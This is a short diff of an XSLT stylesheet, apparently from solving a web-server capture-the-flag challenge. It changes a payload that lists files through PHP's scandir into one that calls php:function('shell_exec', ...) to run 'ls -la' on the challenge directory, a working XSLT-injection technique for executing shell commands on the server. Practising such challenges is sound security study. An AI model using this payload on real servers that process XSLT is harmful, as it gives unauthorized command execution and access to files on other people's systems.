@@ -1,13 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <xsl:template match="/">
-  <html>
-  <body>
-    <h2>Fichiers dans le dossier :</h2>
-    <pre>
-      <xsl:value-of select="php:function('json_encode', php:function('scandir', '.'))"/>
-    </pre>
-  </body>
-  </html>
+  <pre>
+    <xsl:value-of select="php:function('shell_exec', 'ls -la /challenge/web-serveur/ch50/')" />
+  </pre>
 </xsl:template>
 </xsl:stylesheet>
